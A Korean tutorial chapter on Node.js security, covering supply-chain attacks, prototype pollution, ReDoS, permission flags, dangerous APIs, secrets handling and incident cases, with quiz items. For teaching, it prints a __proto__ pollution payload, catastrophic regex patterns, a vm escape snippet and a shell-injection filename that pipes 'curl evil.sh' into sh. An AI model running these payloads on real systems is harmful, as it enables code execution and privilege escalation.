보안: 공급망부터 런타임까지

Node.js 서비스의 침해는 대부분 "해킹"이 아니라 설계대로 동작한 결과입니다. 설치 스크립트가 실행되도록 설계된 npm, 프로토타입 체인을 따라 올라가도록 설계된 객체 모델, 백트래킹하도록 설계된 정규식 엔진. 이 장은 각 레이어에서 그 설계가 공격 표면이 되는 지점과 Node.js가 제공하는 방어 장치(권한 모델, 런타임 플래그, HTTP 한계값, crypto API)를 다룹니다.

학습 목표

  • 공급망 공격의 경로(설치 스크립트, 타이포스쿼팅, 의존성 혼동, 탈취된 메인테이너 계정)를 알고 lockfile·provenance·스크립트 차단으로 막을 수 있다.
  • 프로토타입 오염과 ReDoS의 메커니즘을 코드 수준에서 설명하고, 취약 패턴을 식별·수정할 수 있다.
  • HTTP 서버 한계값(헤더 크기, 타임아웃, 바디 제한)으로 자원 고갈 공격을 막고, 권한 모델로 프로세스의 행동 반경을 제한할 수 있다.
  • 시크릿·암호·명령 실행·경로 처리에서 Node 표준 라이브러리를 올바르게 쓰고, 보안 릴리스를 추적하는 운영 절차를 갖출 수 있다.

2. 공급망: npm과 의존성

평균적인 Node 서비스는 직접 의존성 수십 개, 전이 의존성 수백~수천 개를 가집니다. 그 모두가 ① 설치 시 임의 코드를 실행할 수 있고(lifecycle 스크립트), ② 런타임에 프로세스 권한 전체를 가집니다. 공급망 공격은 이 두 사실을 이용합니다.

3. 프로토타입 오염

JavaScript의 모든 일반 객체는 Object.prototype을 상속하고, obj.__proto__는 그 프로토타입에 접근하는 접근자(accessor)입니다. 사용자 입력의 키를 그대로 써서 객체를 재귀적으로 병합하는 코드(merge, extend, defaultsDeep, 쿼리스트링 파서)는 {"__proto__": {"isAdmin": true}}를 받으면 target.__proto__.isAdmin = true를 실행하고, 그 순간 프로세스의 모든 객체가 isAdmin을 갖게 됩니다.

// 취약: 키를 검사하지 않는 재귀 병합 (lodash < 4.17.12 의 defaultsDeep, 수많은 util 라이브러리)
function merge(target, src) {
  for (const key in src) {
    if (typeof src[key] === 'object' && src[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], src[key]);          // target['__proto__'] === Object.prototype !
    } else target[key] = src[key];
  }
  return target;
}
merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
({}).isAdmin   // true — 모든 객체가 오염됨

JSON.parse 자체는 안전합니다. "__proto__"를 일반 own property로 만들 뿐 프로토타입을 바꾸지 않습니다. 문제는 그 결과를 다른 객체에 복사하는 코드입니다. 오염의 결과는 다양합니다: 권한 체크 우회(if (user.isAdmin)), 옵션 주입(child_process의 shell 옵션, 템플릿 엔진 옵션 → RCE), 서비스 거부(toString 덮어쓰기).

프로토타입 오염 체험기
페이로드를 취약한 merge와 안전한 merge에 각각 넣어 봅니다. 취약 버전은 격리된 iframe 렘(realm)에서 실행되므로 이 페이지는 오염되지 않습니다.

방어 레이어

  1. 코드: 병합/설정 함수에서 __proto__, constructor, prototype 키를 거부하고 Object.hasOwn(src, key)로 own property만 순회. 사용자 입력이 들어가는 맵은 Object.create(null) 또는 Map.
  2. 스키마 검증: 요청 바디를 JSON Schema(ajv)로 검증하고 additionalProperties: false. 정의되지 않은 키는 애초에 들어오지 못한다.
  3. 런타임 플래그: node --disable-proto=delete는 Object.prototype.__proto__ 접근자를 제거(throw는 접근 시 예외). __proto__ 경로는 막지만 constructor.prototype 경로는 못 막는다. --frozen-intrinsics(실험적)는 내장 프로토타입을 동결해 둘 다 막지만, 프로토타입을 확장하는 라이브러리(폴리필 등)가 깨진다.
  4. 의존성: 병합 유틸은 최신 버전으로. 역사적으로 lodash, minimist, qs, yargs-parser, hoek 등 광범위하게 발견됐다.

4. ReDoS: 정규식 백트래킹

V8의 정규식 엔진(Irregexp)은 백트래킹 방식입니다. 패턴이 입력에 매칭되는 경로가 여러 개일 수 있을 때, 한 경로가 실패하면 되돌아가 다른 경로를 시도합니다. 중첩된 반복((a+)+)이나 겹치는 선택지((a|aa)+)가 있으면 경로 수가 입력 길이에 지수적으로 늘어납니다. 그리고 2장을 떠올리면, 정규식은 이벤트 루프 위에서 동기적으로 실행됩니다. 30자짜리 문자열 하나가 프로세스 전체를 몇 분간 멈춥니다. 타임아웃을 걸 방법도 없습니다(JS에는 정규식 실행을 중단할 API가 없음).

위험 패턴왜안전한 대안
^(a+)+$, ^(\w+\s?)*$중첩 반복: 바깥 반복이 안쪽 반복의 분할 방식을 전부 시도중첩 제거: ^a+$, ^\w+(\s\w+)*$(접두가 겹치지 않게)
^(a|aa)+$, (\d+|\d+\.\d+)겹치는 선택지: 같은 입력을 두 갈래가 모두 받음선택지가 서로 배타적이게: ^\d+(\.\d+)?$
.*=.*, ^.*@.*\..*$탐욕적 .*가 연속으로: 다항(O(n²)~O(n³))이지만 긴 입력엔 충분히 치명적구체적 클래스: [^=]*=[^=]*
사용자 제공 정규식어떤 패턴이든 올 수 있음금지. 꼭 필요하면 RE2(re2 네이티브 모듈: 선형 시간 보장, 역참조·전방탐색 불가)
ReDoS 백트래킹 시각화
작은 백트래킹 매처(V8과 같은 탐욕적 깊이 우선 전략)로 입력 길이에 따른 매칭 시도 횟수를 셉니다. 로그 스케일 막대가 직선으로 오르면 지수적입니다. "V8 실측"은 실제 RegExp로 시간을 재며, 보호를 위해 길이를 제한합니다.

실무 규칙: ① 입력 길이를 먼저 제한한다(이메일 254자, 일반 문자열 1~4KB). 지수 패턴도 입력이 20자면 무해하다. ② 정규식 린터(eslint-plugin-regexp의 no-super-linear-backtracking, safe-regex2)를 CI에. ③ 복잡한 파싱은 정규식 대신 파서(URL은 new URL(), 이메일은 길이 + @ 존재 + 발송 확인). ④ Node 자체도 과거 path, url, http 헤더 파싱에서 ReDoS CVE가 있었다. 버전 유지가 곧 방어다.

5. 입력 검증과 HTTP 한계값

5.1 스키마 검증

"검증"은 타입 확인이 아니라 허용 목록입니다. 들어올 수 있는 모든 필드를 열거하고 나머지는 거부합니다. 크기 상한(문자열 길이, 배열 길이, 중첩 깊이)도 스키마에 둡니다. 깊이 1만의 중첩 JSON은 파싱만으로 스택과 CPU를 태웁니다.

const Ajv = require('ajv');
const ajv = new Ajv({ allErrors: false, removeAdditional: false });
const schema = {
  type: 'object', additionalProperties: false,          // 정의 안 된 키(= __proto__ 포함) 거부
  required: ['email', 'name'],
  properties: {
    email: { type: 'string', maxLength: 254, format: 'email' },
    name:  { type: 'string', minLength: 1, maxLength: 100, pattern: '^[^<>]*$' },
    tags:  { type: 'array', maxItems: 20, items: { type: 'string', maxLength: 32 } },
  },
};
const validate = ajv.compile(schema);
app.post('/users', express.json({ limit: '64kb' }), (req, res) => {   // 바디 크기 상한
  if (!validate(req.body)) return res.status(400).json({ errors: validate.errors });
  ...
});

6. 권한 모델과 런타임 플래그

Node 20에서 --experimental-permission으로 도입된 권한 모델은 Node 22/23에서 --permission으로 이름이 바뀌었고 이후 안정화 단계를 밟았습니다(사용 중인 버전의 문서에서 상태를 확인하세요). 켜면 프로세스는 파일 시스템, 자식 프로세스, 워커 스레드, 네이티브 애드온에 접근할 수 없고, 명시적으로 허용한 것만 할 수 있습니다. 최신 버전에는 네트워크(--allow-net), FFI, WASI, 인스펙터 등의 허용 플래그와 "거부하지 않고 기록만 하는" --permission-audit가 추가되었습니다.

$ node --permission -e "require('fs').readFileSync('/etc/hosts')"
Error: Access to this API has been restricted. Use --allow-fs-read to manage permissions.  { code: 'ERR_ACCESS_DENIED', permission: 'FileSystemRead' }

$ node --permission --allow-fs-read=/app --allow-fs-read=/etc/ssl --allow-fs-write=/tmp/app server.js
# 런타임 확인
process.permission.has('fs.read', '/etc/passwd')   // false
process.permission.has('fs.write', '/tmp/app/x')   // true
권한 모델 플래그 빌더
서비스에 필요한 권한만 체크하면 명령줄과, 그 설정에서 거부될 호출의 예를 만들어 줍니다.

      

      
주의 권한 모델은 샌드박스가 아닙니다. 네이티브 애드온을 허용하면 모든 제한을 우회할 수 있고, 허용된 쓰기 경로에 심볼릭 링크를 만드는 식의 우회도 보고되어 왔습니다. "실수로 더 많은 권한을 쓰는 것"을 막는 장치로 보고, 컨테이너 격리(non-root, 읽기 전용 루트 FS, seccomp)와 함께 쓰세요.

7. 위험한 API: 코드 실행, 명령, 경로

    
7.1 eval, new Function, vm은 샌드박스가 아니다

    
vm.runInNewContext는 새 전역 객체를 주는 것이지 격리를 주는 것이 아닙니다. 컨텍스트 안의 코드는 this.constructor.constructor('return process')()처럼 프로토타입 체인을 타고 호스트의 Function에 도달해 process를 얻습니다. 공식 문서도 "신뢰할 수 없는 코드를 실행하는 보안 메커니즘이 아니다"라고 명시합니다. 사용자 코드를 실행해야 한다면 별도 프로세스 + 권한 모델 + 컨테이너(gVisor, Firecracker), 또는 isolated-vm(V8 isolate 분리)이나 WebAssembly 런타임 수준의 격리가 필요합니다.

    
7.2 명령 실행: exec는 셸이다

    

      
셸 인젝션
const { exec } = require('node:child_process');
// filename = "a.png; curl evil.sh | sh"
exec(`convert ${filename} out.png`, cb);
// /bin/sh -c "convert a.png; curl evil.sh | sh out.png"

      
인자 배열, 셸 없음
const { execFile } = require('node:child_process');
execFile('convert', [filename, 'out.png'], { timeout: 10_000, maxBuffer: 1e6 }, cb);
// 셸을 거치지 않으므로 ; | $ 는 그냥 문자
// 추가로 filename 을 허용 문자 집합으로 검증

    

    
spawn/execFile에 shell: true를 주면 다시 exec와 같아집니다. 그리고 3절의 프로토타입 오염으로 shell 옵션이 주입될 수 있다는 점이 두 취약점이 연결되는 지점입니다.

    
7.3 경로 탐색


const path = require('node:path');
const ROOT = path.resolve('/srv/uploads');
function safeJoin(userPath) {
  const full = path.resolve(ROOT, userPath);          // '../../etc/passwd' 를 정규화
  if (full !== ROOT && !full.startsWith(ROOT + path.sep)) throw new Error('path traversal');
  return full;                                         // 심볼릭 링크는 fs.realpath 로 한 번 더 검사
}

    
path.join(ROOT, userPath)만으로는 부족합니다. ..가 정규화되어 ROOT 밖으로 나갑니다. 접두 검사에 path.sep을 붙이는 이유는 /srv/uploads-secret이 /srv/uploads로 시작하기 때문입니다. URL 인코딩(%2e%2e), 널 바이트, 유니코드 정규화도 검사 전에 디코딩되어야 합니다(Express는 경로를 디코딩해 줌).

    
7.4 역직렬화와 기타

    
    
      
  • node-serialize류의 "함수까지 직렬화"하는 라이브러리는 RCE 그 자체입니다. JSON만 쓰세요. v8.deserialize도 신뢰할 수 없는 입력에는 금지.
    • 
      
  • YAML 파서는 safeLoad/기본 안전 스키마. XML은 외부 엔티티(XXE) 비활성화.
    • 
      
  • SSRF: 사용자 제공 URL로 fetch하기 전에 호스트를 허용 목록과 대조하고, 사설 IP·메타데이터 엔드포인트(169.254.169.254)를 거부. DNS 리바인딩 때문에 해석된 IP로 검사해야 합니다.
    • 
      
  • 에러 응답에 스택 트레이스·파일 경로·의존성 버전을 담지 않습니다(NODE_ENV=production에서 Express 기본 동작). 14장.

8. 시크릿과 암호 사용

    
8.1 시크릿이 새는 경로

    
    
      
  • 환경변수: /proc/pid/environ, 자식 프로세스 상속(env: {}로 명시 전달), 진단 리포트(--report-exclude-env), 크래시 덤프. 가능하면 파일 마운트 + 시작 시 읽기 + 변수 삭제.
    • 
      
  • 로그: 요청 헤더 전체, 설정 객체 덤프, 연결 문자열이 포함된 에러 메시지(pg의 에러에 비밀번호는 없지만 URL 전체를 찍는 코드가 흔함). 15장 redaction.
    • 
      
  • 힙 스냅샷/코어 덤프: 메모리 안의 문자열은 그대로 보임. 덤프 파일의 접근 권한과 보관 기간.
    • 
      
  • 소스 저장소: .env 커밋, 테스트 픽스처의 실제 키. git-secrets/gitleaks를 pre-commit과 CI에.
    • 
      
  • 클라이언트 번들: 서버용 키가 프론트엔드 번들에 포함(NEXT_PUBLIC_ 접두 실수 등).

용도맞음틀림

const hash = await new Promise((res, rej) => crypto.scrypt(password, salt, 64, { N: 2 ** 15, r: 8, p: 1 }, (e, k) => e ? rej(e) : res(k)));

8.3 TLS

    
Node 22의 기본 하한은 TLS 1.2, 상한 1.3이며 OpenSSL 3 기본 암호군을 씁니다. 내부 서비스 간에도 TLS(mTLS)를 쓰는 경우 인증서 검증을 끄는 rejectUnauthorized: false와 NODE_TLS_REJECT_UNAUTHORIZED=0은 "개발 편의"가 프로덕션까지 흘러가는 대표적 사고입니다. 사설 CA는 NODE_EXTRA_CA_CERTS로 추가하세요.

  


  

    
9. 보안 릴리스 추적과 운영 절차

    
    
      
  • 릴리스 라인: 짝수 메이저가 LTS(활성 12개월 + 유지 18개월, 총 30개월). 2026년 10월 기준 Node 20은 EOL(2026-04), 22와 24가 LTS. EOL 버전은 보안 패치가 없으므로 사용 자체가 취약점입니다.
    • 
      
  • 보안 릴리스: nodejs.org 블로그에 약 1주 전 사전 공지(영향 라인, 심각도)가 올라오고, 릴리스 당일 CVE 상세가 공개됩니다. 공지 RSS/메일링(nodejs-sec)을 구독하고, 당일 패치할 수 있는 파이프라인(베이스 이미지 재빌드 → 테스트 → 롤아웃)을 미리 갖추세요.
    • 
      
  • 의존성도 같은 주기로: 주간 자동 PR(Renovate) + lockfile 검증. 메이저는 수동.
    • 
      
  • 이미지 스캔: Trivy/Grype로 OS 패키지 + Node 의존성 CVE를 빌드 시 스캔. distroless/slim으로 OS 표면 축소(14장).
    • 
      
  • 런타임 점검: node --permission 가능 여부, USER node, 읽기 전용 루트 FS, 인스펙터 포트 미노출, --report-exclude-env.
    • 
      
  • HTTP 보안 헤더(웹 응답을 내는 경우): helmet 또는 직접 CSP, HSTS, X-Content-Type-Options. API 전용이면 CORS 허용 목록을 좁게.

10. 현업 사고 사례

    
사례 1: CI에서 설치 스크립트가 환경변수를 외부로
      
인기 유틸 패키지의 메인테이너 계정이 피싱으로 탈취되고 패치 버전에 postinstall이 추가됐습니다. ^ 범위 + lockfile 미커밋 레포는 다음 CI에서 자동으로 설치했고, 스크립트가 process.env 전체를 외부로 전송. 클라우드 키가 유출되어 전면 회전. 이후 조치: lockfile 커밋 + npm ci --ignore-scripts, OIDC 기반 단기 자격증명으로 CI의 장기 키 제거.

    

    
사례 2: 이메일 검증 정규식 하나로 전체 API 다운
      
회원가입의 이메일 정규식이 ^([a-zA-Z0-9]+[._-]?)*@... 형태의 중첩 반복. 공격자가 아닌 봇이 500자짜리 잘못된 이메일을 보냈고, 요청 하나가 루프를 수 분간 점유. 헬스체크 실패로 파드 재시작, 봇은 재시도. 입력 길이 254자 제한과 패턴 단순화로 해결. 위 시각화에서 ^(\w+\s?)*$를 n=25로 돌려 보세요.

    

    
사례 3: 설정 병합으로 관리자 권한
      
사용자 프로필 업데이트 API가 deepMerge(user, req.body)로 부분 업데이트를 구현. 바디에 {"__proto__":{"role":"admin"}}을 보내자 이후 생성되는 모든 객체에 role이 상속되어 권한 체크가 통과. 로그에는 아무 에러도 없었고, 다른 사용자의 요청까지 영향을 받아 원인 추적에 며칠이 걸림. additionalProperties:false 스키마와 키 거부 병합으로 수정, --disable-proto=delete 추가.

    

    
사례 4: 디버그 편의가 남긴 인스펙터
      
장애 분석 중 SIGUSR1로 인스펙터를 열고 닫지 않았고, 파드 매니페스트에 디버그용 hostNetwork: true가 남아 9229 포트가 노드 IP로 노출. 내부망 스캔에서 발견되어 사고로 분류. 인스펙터 사용 절차에 "종료 확인"을 추가하고 네트워크 정책으로 9229 차단.

확인 문제

  

    
JSON.parse('{"__proto__":{"x":1}}')를 실행했다. 이 시점에 ({}).x의 값은?

    
    
    
    
    
JSON.parse는 안전합니다. 오염은 그 결과를 키 검사 없이 다른 객체에 재귀 복사할 때 target['__proto__'] 접근자를 통해 일어납니다.

  

  

    
다음 중 ReDoS에 취약한 패턴은?

    
    
    
    
    
(\w+\s?)*는 바깥 *와 안쪽 +가 중첩되어 있고 \s?가 선택적이라, "wordword"를 나누는 방법이 지수적으로 많습니다. 끝에 매칭 불가 문자가 오면 모든 분할을 시도합니다. 나머지는 각 위치에서 경로가 하나뿐입니다.

  

  

    
node --permission --allow-fs-read=/app server.js로 띄운 서버에서 가장 올바른 설명은?

    
    
    
    
    
권한 모델은 명시 허용 외 전부 거부입니다. 쓰기는 --allow-fs-write, 자식 프로세스는 --allow-child-process, 워커는 --allow-worker, 애드온은 --allow-addons가 각각 필요합니다. vm은 권한 모델과 무관하게 샌드박스가 아닙니다.

  

  

    
slowloris 공격(헤더를 아주 천천히 보내 커넥션 점유)을 Node 레벨에서 완화하는 설정은?

    
    
    
    
    
headersTimeout은 헤더 수신이 완료되어야 하는 시한입니다. 기본 60초를 10~30초로 낮추면 느린 헤더 커넥션이 빨리 정리됩니다. requestTimeout은 바디까지 포함한 전체 시한입니다.

  

  

    
CI에서 공급망 공격의 피해를 가장 직접적으로 줄이는 조합은?

    
    
    
    
    
lockfile은 "어제와 같은 트리"를, --ignore-scripts는 설치 시 코드 실행 차단을, 단기 OIDC 자격증명은 유출 시 피해 축소를 담당합니다. node_modules 커밋은 재현성은 주지만 갱신·검토가 불가능해집니다.
